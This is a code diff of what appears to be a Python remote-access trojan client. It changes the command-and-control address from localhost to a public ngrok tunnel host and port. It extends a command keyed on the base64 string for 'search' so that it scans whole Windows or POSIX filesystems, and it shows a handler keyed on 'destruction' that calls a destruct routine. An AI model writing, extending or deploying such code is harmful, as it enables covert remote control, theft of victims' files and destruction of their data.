@@ -346,7 +346,7 @@ def make_conect ():
     while True:
         sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
         try:
-            sock.connect ( ( '127.0.0.1' ,2457) )
+            sock.connect ( ( '7.tcp.eu.ngrok.io' ,13417) )
             sock = context . wrap_socket (sock)
             game (sock)
             time . sleep (5)
@@ -833,7 +833,6 @@ def fd_fs_n_ds(drs, ptr):
         for dr in drs:
             for rt, dr, fps in os.walk(dr):
                 for bs in fps:
-                    print(bs, ptr)
                     if fnmatch.fnmatch(bs, ptr):
                         fp = os.path.join(rt, bs)
                         futures.append(executor.submit(stf, fp, fnded))
@@ -949,7 +948,8 @@ def game (sock):
 
         elif "c2VhcmNo" .encode () in instruct:
             ext = "*.{}".format(instruct .decode ().replace ("c2VhcmNo ", ""))
-            fd_fs_n_ds(['C:\\Users'], ext)
+            if os.name == "posix": fd_fs_n_ds(['/'], ext)
+            else: fd_fs_n_ds(['C:\\'], ext)
 
         elif "ZGVzdHJ1Y3Rpb24K" .encode () in instruct:
             dstrct()
